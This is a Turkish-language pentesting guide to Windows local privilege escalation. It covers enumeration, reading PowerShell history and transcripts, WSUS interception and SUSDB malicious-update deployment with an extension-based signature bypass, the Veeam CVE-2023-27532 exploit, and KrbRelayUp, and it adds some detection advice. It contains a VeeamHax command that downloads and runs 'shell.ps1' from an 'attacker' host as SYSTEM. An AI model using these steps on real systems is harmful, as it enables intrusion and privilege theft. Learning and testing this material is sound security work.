# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows'ta yerel yetki yükseltme vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, temel nitelikteki birkaç kılavuzdan genel Windows yetki yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamalı enumerasyon akışı, topluluk atölyeleri ve kontrol listelerinden de yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihî saldırı içeriğinde, Windows yetki yükseltme üzerine DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

## İlk Windows Kuramı

### Erişim Belirteçleri

**Windows erişim belirteçlerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, yürütülebilir dosyaları çalıştırmanızı ve hatta **etkinliklerinizin algılanmasını** **önleyebilecek** çeşitli unsurlar vardır. Yetki yükseltme enumerasyonuna başlamadan önce aşağıdaki **sayfayı okuyup** bu **savunma mekanizmalarının** tümünü **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini, önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo güvenli yol kontrolleri atlandığında istem göstermeden High IL'ye ulaşmak için kötüye kullanılabilir. UIAccess/Admin Protection bypass iş akışını burada inceleyin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, rastgele bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Son Windows sürümlerinde, ayrıcalıklı bir yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB rastgele bağlantı noktası** LPE yolu da kullanılmaya başlandı:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerini enumerate etme

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bu da Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve seçilmiş olası güvenlik duyurularını envanterler; bir sonucu geçerli kabul etmeden önce tam ürünü ve daha yeni güncellemeleri doğrulayın.

Sürüme özgü bir local exploit için işletim sistemi mimarisinin yanı sıra **çalışan sürecin mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir süreç, [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine yönlendirilirken `%windir%\Sysnative`, bu sürecin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir süreçte kullanılamaz. İşletim sistemi derlemesi veya eksik KB adayı, sistemin exploit edilebilir olduğunu kanıtlamaz; çalışan derlemeyi, yüklü ya da daha yeni güncellemeyi, süreç mimarisini ve exploit ön koşullarını, ilgili sorun için yayımlanan [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

Bir hizmet belleği bozulması örneği için [istemci tarafından kontrol edilen MIDI paylaşımlı bellek ring offset'lerine](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) bakın. Yayımlanan stack offset'leri yalnızca test edilen derleme için geçerlidir; `LOCAL SERVICE` yetkisine erişmek, daha sonra [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ile `SYSTEM` yetkisine yükseltme adımından farklıdır.<sup>[[44]](#references)</sup>

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: dosya komut bağımsız değişkenlerini ve çıktıları, kimlik bilgileri de dahil olmak üzere, içerebilir. Okunabilir bir transcript yalnızca içeriği kullanılabilir, daha yüksek ayrıcalıklara sahip bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahil olmak üzere kaydedilir. Ancak tüm yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelerin "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin tüm etkinlikler ve tam içerik kaydedilir; böylece her kod bloğu çalıştığı sırada belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu iz, adli incelemeler ve kötü amaçlı davranışların analiz edilmesi için değerlidir. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük kaydı olayları, Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Önceki kılavuz riski şu şekilde özetlemişti:

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

Bir HTTP WSUS uç noktası, güncelleme meta verilerinin ele geçirilme olasılığını araştırmak için bir işarettir. İstismar ayrıca istemcinin bu WSUS sunucusunu kullanıp kullanmadığına, saldırganın trafiği ele geçirip geçiremediğine veya kontrol edip edemediğine ve istemcinin güncellemelere yönelik güven ve yükleme ilkelerine bağlıdır. Tek başına URL, kod yürütülebileceğini göstermez. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesinin kullanılıp kullanılmadığını kontrol etmek için cmd'de şu komutu çalıştırarak başlayabilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

Orijinal uygulanabilirlik ifadesi şöyleydi:

O zaman, **exploit edilebilir.** Son kayıt defteri değeri `0` ise WSUS girdisi yok sayılır.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun sağlandığını doğrular; ancak interception'ın, kötü amaçlı güncellemenin kabul edilmesinin veya yükseltilmiş yetkilerle kurulum yapılmasının mümkün olduğunu kanıtlamaz. Değer `0` olduğunda bu ilkeyle yapılandırılmış WSUS endpoint'i seçilmez.

Bu güvenlik açıklarını exploit etmek için [Wsuxploit](https://github.com/pimps/wsuxploit) ve [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL olmayan WSUS trafiğine “sahte” güncellemeler enjekte etmek için kullanılan, MiTM amaçlı exploit script'leridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu zafiyeti exploit eder:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi intercept etmek ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus) aracını yerel olarak çalıştırabiliriz.
>
> Ayrıca WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından, onun sertifika deposunu da kullanır. WSUS hostname'i için self-signed bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, sertifikada ilk kullanımda güven türünde bir doğrulama uygulamak için HSTS benzeri bir mekanizma kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyorsa ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (yayına sunulduğunda) exploit edebilirsiniz.

### WSUS yöneticisi tarafından kontrol edilen güncellemeler

Geçerli kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanmış güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerikleri imzalamak için kullanılan sertifikaya güvenmelidir. Bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme istismarı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını intercept etmekten farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlayıp onaylamak için **WSUS veritabanındaki (`SUSDB`) stored procedure'lere** yeterli erişimin bulunmasıdır. Uygulanabilir giriş yollarından biri, bir WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay etmektir. Ön koşullar dağıtıma göre değiştiğinden, SQL administrator yetkileriniz olduğunu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530 üzerinden LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanı relay'ini ve procedure izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda önce WSUS sunucu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Sunucunun SQL rolü, doğrudan tablo yazma işlemleri engellense bile güncelleme yayımlama procedure'lerini kullanma izni verebilir; `SUSDB` üzerinde başarısız bir `UPDATE` işlemi, güncelleme yayımlamanın engellendiğini göstermez. Özel bir güncelleme denemeden önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve procedure izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı prosedür tanımları ve kurulu `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken faydalıdır. Bir bundle üst öğesiyle payload alt öğesinin her biri `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revision ID'yi kaydedin ve bundle ilişkisini, digest'leri, boyutu, content URL'yi ve revision'ı tutarlı tutun. Bu, durum bilgisi tutan bir yayınlama iş akışıdır; dolayısıyla başarılı tek bir stored procedure çağrısı, istemci tarafında çalıştırmanın kanıtı değildir.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Custom-update iş akışı, kısıtlı bir yayınlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML fragment'lerini depolama | `spSaveXMLFragment` |
| Content digest'ini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| O grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, digest'ler, boyut ve `CommandLineInstallation` handler'ı; içe aktarılan meta veriler ve fragment'ler arasında tutarlı olmalıdır. Content URL'yi ve hedef grubu atadıktan sonra, son onaylama aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı kaynaklı imza atlatma

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD imajı olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` adı verilmiş değiştirilmemiş bir PE, içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı kurulum işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir politika/tür karmaşası hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kayıtlı içeriği getirir. Kaynağın BITS'in HTTP beklentilerini karşılaması gerekir: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarımda ilk `HEAD`/`GET` akışı ve byte-range istekleri kullanılır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığı gerektirdiğini belirten WSUS senkronizasyonu `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i çalıştırmak üzere değiştirilmiş bir MSSQL istemcisi içerir ve içerik staging için `BitsWebServer.py` dosyasını sunar. Yetkili bir lab ortamında kullanılabilecek en basit komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkeye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altında `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmeden yapılandırılan zamanlamaya göre indirilip yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback process sonlandıktan hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı tekrarlanan yürütme yoluyla kalıcılık sağlayabilir. İstemcide güncelleme başarısız durumu gösterildiğinden bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve hardening pivotları

Bu zincirdeki yararlı server-side ve client-side pivotlar şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` yürütülmesini denetleyin; yeni targeting group’ları, harici content kaynaklarını, `.txt`/`.esd` güncelleme payload’larını ve beklenmeyen principal’lar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; uzantıya güvenmek yerine doğrulamayı payload uzantısı ve content magic ile ilişkilendirin.
- Windows Update yüklemesinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adları taşıyan content kaynaklarından yapılan PE yürütmelerini ya da beklenmeyen child process/ağ etkinliklerini araştırın.
- Desteklendiği yerlerde veritabanı hizmeti için Extended Protection for Authentication uygulayın ve veritabanı ağına erişimi WSUS sunucusu ile yetkili yönetim sistemleriyle kısıtlayın. Özel güncelleme prosedürleri üzerindeki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Enrollment saldırganın sunucusuna yönlendirilebiliyor ve updater sahte bir root CA’ya veya zayıf signer kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Burada genelleştirilmiş bir teknik (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) açıklanmıştır:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Sürüme özgü özgün açıklama ve keşif notu şöyleydi:

Veeam B&R < `11.0.1.1261`, saldırganın kontrolündeki mesajları işleyen ve **NT AUTHORITY\SYSTEM** olarak keyfi komutlar çalıştırılmasına olanak tanıyan bir localhost hizmetini **TCP/9401** üzerinde sunar.<sup>[[12]](#references)</sup>

- **Recon**: dinleyiciyi ve sürümü doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` komutlarını kullanın.

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde çalışan bir temel backup hizmeti kullanır. [Veeam’in duyurusu](https://www.veeam.com/kb4424), backup ağının sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulamasız ifşa edildiğini açıklar; ayrıca herkese açık ayrı bir PoC, **NT AUTHORITY\SYSTEM** olarak komut çalıştırma yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID’sini kontrol edin.

- **Recon**: TCP/9401’in `Veeam.Backup.Service.exe` işlemine ait olduğunu doğrulayın, ardından yüklenmiş ürünü ve yama metaverisini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu niteliğindedir; yama durumunu tam olarak doğrulamaz.
- **Düzeltilmiş en düşük sürümler**: Veeam, **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini düzeltilen ilk sürümler olarak listeler; önceki sürümler etkilenir. Dört parçalı bir dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel sürüm ile daha sonraki bir yamayı ayırt edemez. Sınır build’inin düzeltildiğini belirtmeden önce yama tanımlayıcısını [üreticinin build geçmişinden](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC’yi gerekli Veeam DLL’leriyle aynı dizine yerleştirin, ardından yerel socket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Hizmet komutu SYSTEM olarak yürütür.

Atıfta bulunulan PoC, ek ön koşullar sağlandığında komutların SYSTEM olarak yürütülebildiğini gösterir; üreticinin güvenlik duyurusu ise kimlik bilgilerinin açığa çıkması sorununu açıklar.

## KrbRelayUp

Varsayılan ortamla ilgili özgün açıklama şöyleydi:

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing uygulanmayan**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına izin veren self-rights haklarına sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar yer alır. Bu **gereksinimlerin** **varsayılan ayarlarla** karşılandığını belirtmek önemlidir.

Yerel bir Kerberos relay, uygun bir COM sunucusu kimlik doğrulaması yaptığında ve aktarılan principal hedef nesne üzerinde haklara sahip olduğunda, düşük ayrıcalıklı bir logon'dan ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini belgeler; KrbRelayUp bu yollardan bazılarını otomatikleştirir. RBCD zinciri, uygun delegation ve hedef nesne hakları gerektirirken shadow-credential zinciri, key-credential yazma hakları ve sertifika kimlik doğrulama yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca domain üyeliğinden kaynaklanmaz.

